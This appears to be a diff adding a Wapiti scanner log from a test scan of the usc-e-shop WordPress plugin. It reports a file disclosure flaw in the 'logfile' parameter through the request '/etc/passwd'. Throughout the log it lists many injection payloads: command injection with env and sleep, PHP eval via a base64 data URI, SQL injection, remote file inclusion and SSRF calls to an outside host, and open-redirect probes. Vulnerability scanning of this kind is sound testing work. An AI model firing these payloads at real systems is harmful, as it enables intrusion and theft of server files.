@@ -1,0 +1,91 @@
+2024-03-21 16:35:53.805 | VERBOSE  | wapitiCore.net.explorer:_async_analyze:286 - [+] GET http://web/wp-content/plugins/usc-e-shop/functions/content-log.php?logfile=fuzz (0)
+2024-03-21 16:35:53.932 | GREEN    | wapitiCore.controller.wapiti:save_scan_state:359 - [*] Saving scan state, please wait...
+2024-03-21 16:35:53.933 | INFO     | wapitiCore.controller.wapiti:save_scan_state:363 - This scan has been saved in the file /home/wapiti/.wapiti/scans/web_folder_23a78a29.db
+2024-03-21 16:35:53.936 | INFO     | wapitiCore.main.wapiti:wapiti_main:380 - [*] Wapiti found 1 URLs and forms during the scan
+2024-03-21 16:35:53.964 | INFO     | wapitiCore.controller.wapiti:_load_attack_modules:289 - [*] Existing modules:
+2024-03-21 16:35:53.964 | INFO     | wapitiCore.controller.wapiti:_load_attack_modules:290 - 	 backup, brute_login_form, buster, cookieflags, crlf, csp, csrf, drupal_enum, exec, file, htaccess, htp, http_headers, https_redirect, log4shell, methods, nikto, permanentxss, redirect, shellshock, spring4shell, sql, ssl, ssrf, takeover, timesql, upload, wapp, wp_enum, xss, xxe
+2024-03-21 16:35:54.050 | ERROR    | wapitiCore.controller.wapiti:_load_attack_modules:298 - [!] Unable to import module ssl: No module named 'humanize'
+2024-03-21 16:35:54.067 | ERROR    | wapitiCore.controller.wapiti:filter_modules_with_options:130 - [!] Unable to find a module named ssl
+2024-03-21 16:35:54.068 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module http_headers
+2024-03-21 16:35:54.084 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/wp-content/plugins/usc-e-shop/functions/content-log.php?logfile=fuzz (0)
+2024-03-21 16:35:54.093 | BLUE     | wapitiCore.attack.mod_http_headers:check_header:83 - Checking X-Frame-Options:
+2024-03-21 16:35:54.093 | RED      | wapitiCore.attack.mod_http_headers:check_header:85 - X-Frame-Options is not set
+2024-03-21 16:35:54.159 | BLUE     | wapitiCore.attack.mod_http_headers:check_header:83 - Checking X-Content-Type-Options:
+2024-03-21 16:35:54.159 | RED      | wapitiCore.attack.mod_http_headers:check_header:85 - X-Content-Type-Options is not set
+2024-03-21 16:35:54.231 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module ssrf
+2024-03-21 16:35:54.243 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/wp-content/plugins/usc-e-shop/functions/content-log.php?logfile=fuzz (0)
+2024-03-21 16:35:54.244 | VERBOSE  | wapitiCore.attack.mod_ssrf:attack:175 - [¨] GET http://web/wp-content/plugins/usc-e-shop/functions/content-log.php?logfile=https%3A%2F%2Fwapiti3.ovh%2Fssrf%2Fgmvjvm%2F1%2F6c6f6766696c65%2F (0)
+2024-03-21 16:35:54.267 | INFO     | wapitiCore.attack.mod_ssrf:finish:185 - [*] Asking endpoint URL https://wapiti3.ovh/get_ssrf.php?session_id=gmvjvm for results, please wait...
+2024-03-21 16:35:56.553 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module file
+2024-03-21 16:35:56.567 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/wp-content/plugins/usc-e-shop/functions/content-log.php?logfile=fuzz (0)
+2024-03-21 16:35:56.569 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-content/plugins/usc-e-shop/functions/content-log.php?logfile=https%3A%2F%2Fwapiti3.ovh%2F%2Fe.php (0)
+2024-03-21 16:35:56.577 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-content/plugins/usc-e-shop/functions/content-log.php?logfile=https%3A%2F%2Fwapiti3.ovh%2F%2Fe.php%00 (0)
+2024-03-21 16:35:56.584 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-content/plugins/usc-e-shop/functions/content-log.php?logfile=%2Fetc%2Fpasswd (0)
+2024-03-21 16:35:56.664 | RED      | wapitiCore.attack.mod_file:attack:250 - ---
+2024-03-21 16:35:56.664 | RED      | wapitiCore.attack.mod_file:attack:251 - Linux local file disclosure vulnerability in http://web/wp-content/plugins/usc-e-shop/functions/content-log.php via injection in the parameter logfile
+2024-03-21 16:35:56.664 | RED      | wapitiCore.attack.mod_file:attack:261 - Evil request:
+2024-03-21 16:35:56.665 | RED      | wapitiCore.attack.mod_file:attack:262 -     GET /wp-content/plugins/usc-e-shop/functions/content-log.php?logfile=%2Fetc%2Fpasswd HTTP/1.1
+    host: web
+    connection: keep-alive
+    user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
+    accept-language: en-US
+    accept-encoding: gzip, deflate, br
+    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+2024-03-21 16:35:56.665 | RED      | wapitiCore.attack.mod_file:attack:263 - ---
+2024-03-21 16:35:56.699 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module exec
+2024-03-21 16:35:56.716 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/wp-content/plugins/usc-e-shop/functions/content-log.php?logfile=fuzz (0)
+2024-03-21 16:35:56.719 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/wp-content/plugins/usc-e-shop/functions/content-log.php?logfile=%3Benv%3B (0)
+2024-03-21 16:35:56.728 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/wp-content/plugins/usc-e-shop/functions/content-log.php?logfile=%7Cenv%7C (0)
+2024-03-21 16:35:56.736 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/wp-content/plugins/usc-e-shop/functions/content-log.php?logfile=a%3Benv%3B (0)
+2024-03-21 16:35:56.744 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/wp-content/plugins/usc-e-shop/functions/content-log.php?logfile=a%3Benv%3B (0)
+2024-03-21 16:35:56.752 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/wp-content/plugins/usc-e-shop/functions/content-log.php?logfile=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fusr%2Fbin%2Fenv%7C (0)
+2024-03-21 16:35:56.760 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/wp-content/plugins/usc-e-shop/functions/content-log.php?logfile=fuzz%3Benv%3B (0)
+2024-03-21 16:35:56.769 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/wp-content/plugins/usc-e-shop/functions/content-log.php?logfile=fuzz%0Aenv%3B (0)
+2024-03-21 16:35:56.779 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/wp-content/plugins/usc-e-shop/functions/content-log.php?logfile=%26set%26 (0)
+2024-03-21 16:35:56.787 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/wp-content/plugins/usc-e-shop/functions/content-log.php?logfile=set (0)
+2024-03-21 16:35:56.797 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/wp-content/plugins/usc-e-shop/functions/content-log.php?logfile=env (0)
+2024-03-21 16:35:56.804 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/wp-content/plugins/usc-e-shop/functions/content-log.php?logfile=%2Fe%00 (0)
+2024-03-21 16:35:56.810 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/wp-content/plugins/usc-e-shop/functions/content-log.php?logfile=a%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F (0)
+2024-03-21 16:35:56.817 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/wp-content/plugins/usc-e-shop/functions/content-log.php?logfile=a%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23 (0)
+2024-03-21 16:35:56.822 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/wp-content/plugins/usc-e-shop/functions/content-log.php?logfile=%22%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F (0)
+2024-03-21 16:35:56.827 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/wp-content/plugins/usc-e-shop/functions/content-log.php?logfile=%22%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23 (0)
+2024-03-21 16:35:56.832 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/wp-content/plugins/usc-e-shop/functions/content-log.php?logfile=%27%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F (0)
+2024-03-21 16:35:56.838 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/wp-content/plugins/usc-e-shop/functions/content-log.php?logfile=%27%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23 (0)
+2024-03-21 16:35:56.842 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/wp-content/plugins/usc-e-shop/functions/content-log.php?logfile=%22.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F (0)
+2024-03-21 16:35:56.850 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/wp-content/plugins/usc-e-shop/functions/content-log.php?logfile=%22.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%23 (0)
+2024-03-21 16:35:56.855 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/wp-content/plugins/usc-e-shop/functions/content-log.php?logfile=%27.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F (0)
+2024-03-21 16:35:56.860 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/wp-content/plugins/usc-e-shop/functions/content-log.php?logfile=%27.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%23 (0)
+2024-03-21 16:35:56.866 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/wp-content/plugins/usc-e-shop/functions/content-log.php?logfile=%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F (0)
+2024-03-21 16:35:56.872 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/wp-content/plugins/usc-e-shop/functions/content-log.php?logfile=%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23 (0)
+2024-03-21 16:35:56.877 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/wp-content/plugins/usc-e-shop/functions/content-log.php?logfile=data%3A%3Bbase64%2CPD9waHAgZWNobyAndzRwMXQxJywnX2V2YWwnOyA%2FPg%3D%3D (0)
+2024-03-21 16:35:56.883 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/wp-content/plugins/usc-e-shop/functions/content-log.php?logfile=a%60%29%60 (0)
+2024-03-21 16:35:56.888 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/wp-content/plugins/usc-e-shop/functions/content-log.php?logfile=a%60sleep%2060%60 (0)
+2024-03-21 16:35:56.893 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/wp-content/plugins/usc-e-shop/functions/content-log.php?logfile=a%3Bsleep%2060%3B (0)
+2024-03-21 16:35:56.900 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/wp-content/plugins/usc-e-shop/functions/content-log.php?logfile=a%7Csleep%2060%3B (0)
+2024-03-21 16:35:56.905 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/wp-content/plugins/usc-e-shop/functions/content-log.php?logfile=%26ping%20-n%2025%20127.0.0.1%26 (0)
+2024-03-21 16:35:56.936 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module csp
+2024-03-21 16:35:56.953 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/wp-content/plugins/usc-e-shop/functions/content-log.php?logfile=fuzz (0)
+2024-03-21 16:35:56.958 | RED      | wapitiCore.attack.mod_csp:attack:58 - CSP is not set
+2024-03-21 16:35:57.032 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module sql
+2024-03-21 16:35:57.049 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/wp-content/plugins/usc-e-shop/functions/content-log.php?logfile=fuzz (0)
+2024-03-21 16:35:57.049 | VERBOSE  | wapitiCore.attack.mod_sql:error_based_attack:368 - [¨] GET http://web/wp-content/plugins/usc-e-shop/functions/content-log.php?logfile=fuzz%C2%BF%27%22%28 (0)
+2024-03-21 16:35:57.065 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/wp-content/plugins/usc-e-shop/functions/content-log.php?logfile=fuzz%20AND%2087%3D182%20AND%2071%3D71 (0)
+2024-03-21 16:35:57.072 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/wp-content/plugins/usc-e-shop/functions/content-log.php?logfile=fuzz%27%20AND%2053%3D90%20AND%20%2781%27%3D%2781 (0)
+2024-03-21 16:35:57.079 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/wp-content/plugins/usc-e-shop/functions/content-log.php?logfile=fuzz%22%20AND%2040%3D131%20AND%20%2242%22%3D%2242 (0)
+2024-03-21 16:35:57.088 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/wp-content/plugins/usc-e-shop/functions/content-log.php?logfile=fuzz%29%20AND%2028%3D61%20AND%20%2812%3D12 (0)
+2024-03-21 16:35:57.098 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/wp-content/plugins/usc-e-shop/functions/content-log.php?logfile=fuzz%27%29%20AND%2051%3D77%20AND%20%28%2783%27%3D%2783 (0)
+2024-03-21 16:35:57.107 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/wp-content/plugins/usc-e-shop/functions/content-log.php?logfile=fuzz%22%29%20AND%2018%3D85%20AND%20%28%2229%22%3D%2229 (0)
+2024-03-21 16:35:57.134 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module xss
+2024-03-21 16:35:57.150 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/wp-content/plugins/usc-e-shop/functions/content-log.php?logfile=fuzz (0)
+2024-03-21 16:35:57.176 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module cookieflags
+2024-03-21 16:35:57.192 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/wp-content/plugins/usc-e-shop/functions/content-log.php?logfile=fuzz (0)
+2024-03-21 16:35:57.210 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module redirect
+2024-03-21 16:35:57.222 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/wp-content/plugins/usc-e-shop/functions/content-log.php?logfile=fuzz (0)
+2024-03-21 16:35:57.223 | VERBOSE  | wapitiCore.attack.mod_redirect:attack:53 - [¨] http://web/wp-content/plugins/usc-e-shop/functions/content-log.php?logfile=https%3A%2F%2Fopenbugbounty.org%2F
+2024-03-21 16:35:57.227 | VERBOSE  | wapitiCore.attack.mod_redirect:attack:53 - [¨] http://web/wp-content/plugins/usc-e-shop/functions/content-log.php?logfile=%2F%2Fopenbugbounty.org%2F
+2024-03-21 16:35:57.246 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module upload
+2024-03-21 16:35:57.270 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module permanentxss
+2024-03-21 16:35:57.281 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/wp-content/plugins/usc-e-shop/functions/content-log.php?logfile=fuzz (0)
+2024-03-21 16:35:57.335 | GREEN    | wapitiCore.controller.wapiti:write_report:601 - [*] Generating report...
+2024-03-21 16:35:57.358 | SUCCESS  | wapitiCore.controller.wapiti:write_report:603 - A report has been generated in the file ./data/output//usc-e-shop.json/
+2024-03-21 16:35:57.358 | SUCCESS  | wapitiCore.controller.wapiti:write_report:605 - Open ./data/output//usc-e-shop.json/web_03212024_1635.html with a browser to see this report.
